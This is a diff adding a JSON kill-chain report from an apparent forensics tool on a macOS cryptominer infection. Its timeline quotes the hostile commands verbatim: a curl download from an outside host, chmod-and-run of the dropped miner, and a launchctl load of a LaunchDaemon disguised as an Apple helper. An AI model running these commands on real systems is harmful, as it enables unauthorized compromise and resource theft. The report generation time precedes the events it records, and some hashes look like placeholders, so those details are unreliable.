@@ -1,0 +1,165 @@
+{
+  "tool": "GraySentinel Cryptominer Kill-Chain Reconstructor",
+  "version": "1.0.0",
+  "generated_utc": "2026-09-16T03:30:02Z",
+  "host": "mac-victim-07",
+  "priority": "P1",
+  "rationale": "Active compromise: RCE + running miner + reboot persistence + live C2.",
+  "macro_verdict": "MALICIOUS",
+  "timeline": [
+    {
+      "ts": "2026-09-16T09:41:02Z",
+      "stage": "Delivery",
+      "process": "Microsoft Word",
+      "parent": "launchd",
+      "detail": "/Applications/Microsoft Word.app",
+      "remote": ""
+    },
+    {
+      "ts": "2026-09-16T09:41:03Z",
+      "stage": "Execution",
+      "process": "osascript",
+      "parent": "Microsoft Word",
+      "detail": "osascript -e do shell script curl -s http://198.51.100.44/assets/update.bin -o /tmp/.u",
+      "remote": "198.51.100.44:80"
+    },
+    {
+      "ts": "2026-09-16T09:41:03Z",
+      "stage": "Execution",
+      "process": "osascript",
+      "parent": "Microsoft Word",
+      "detail": "NETWORK",
+      "remote": "198.51.100.44:80"
+    },
+    {
+      "ts": "2026-09-16T09:41:05Z",
+      "stage": "Download (C2 stage-1)",
+      "process": "curl",
+      "parent": "osascript",
+      "detail": "curl -s http://198.51.100.44/assets/update.bin -o /tmp/.u",
+      "remote": "198.51.100.44:80"
+    },
+    {
+      "ts": "2026-09-16T09:41:07Z",
+      "stage": "Miner launch",
+      "process": "sh",
+      "parent": "osascript",
+      "detail": "sh -c chmod +x /tmp/.u; /tmp/.u --pool 203.0.113.9:8443",
+      "remote": ""
+    },
+    {
+      "ts": "2026-09-16T09:41:08Z",
+      "stage": "Miner launch",
+      "process": ".u",
+      "parent": "sh",
+      "detail": "/tmp/.u --pool 203.0.113.9:8443 --donate 0",
+      "remote": "203.0.113.9:8443"
+    },
+    {
+      "ts": "2026-09-16T09:41:08Z",
+      "stage": "Miner launch",
+      "process": ".u",
+      "parent": "sh",
+      "detail": "NETWORK",
+      "remote": "203.0.113.9:8443"
+    },
+    {
+      "ts": "2026-09-16T09:41:12Z",
+      "stage": "Miner launch",
+      "process": ".u",
+      "parent": "sh",
+      "detail": "write /Library/LaunchDaemons/com.apple.softwareupdated.helper.plist",
+      "remote": ""
+    },
+    {
+      "ts": "2026-09-16T09:41:13Z",
+      "stage": "Persistence",
+      "process": "launchctl",
+      "parent": ".u",
+      "detail": "launchctl load /Library/LaunchDaemons/com.apple.softwareupdated.helper.plist",
+      "remote": ""
+    },
+    {
+      "ts": "2026-09-16T09:42:30Z",
+      "stage": "Miner launch",
+      "process": ".u",
+      "parent": "launchd",
+      "detail": "NETWORK",
+      "remote": "203.0.113.9:8443"
+    },
+    {
+      "ts": "2026-09-16T09:47:30Z",
+      "stage": "Miner launch",
+      "process": ".u",
+      "parent": "launchd",
+      "detail": "NETWORK",
+      "remote": "203.0.113.9:8443"
+    },
+    {
+      "ts": "2026-09-16T09:52:31Z",
+      "stage": "Miner launch",
+      "process": ".u",
+      "parent": "launchd",
+      "detail": "sustained_cpu_98pct",
+      "remote": "203.0.113.9:8443"
+    }
+  ],
+  "iocs": {
+    "c2_ips": [
+      "198.51.100.44:80",
+      "203.0.113.9:8443"
+    ],
+    "file_hashes": [
+      "a94a8fe5ccb19ba61c4c0873d391e987982fbbd3b8c1795d9e1f6b5f7c9a1234",
+      "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"
+    ],
+    "dropped": [
+      "/tmp/.u"
+    ],
+    "persistence": [
+      "/Library/LaunchDaemons/com.apple.softwareupdated.helper.plist"
+    ]
+  },
+  "attck": [
+    [
+      "Initial Access",
+      "T1566.001",
+      "Spearphishing attachment (macro-enabled doc)"
+    ],
+    [
+      "Execution",
+      "T1204.002",
+      "User opens document; AutoOpen fires macro"
+    ],
+    [
+      "Execution",
+      "T1059.002",
+      "osascript 'do shell script' pivot"
+    ],
+    [
+      "Command & Control",
+      "T1105",
+      "curl pulls stage-1 binary from 198.51.100.44"
+    ],
+    [
+      "Execution",
+      "T1059.004",
+      "sh chmod +x and runs /tmp/.u miner"
+    ],
+    [
+      "Impact",
+      "T1496",
+      "XMRig-style resource hijack (98% CPU)"
+    ],
+    [
+      "Persistence",
+      "T1543.001",
+      "LaunchDaemon com.apple.softwareupdated.helper"
+    ],
+    [
+      "Command & Control",
+      "T1071.001",
+      "HTTPS beacon to 203.0.113.9:8443/gate"
+    ]
+  ]
+}
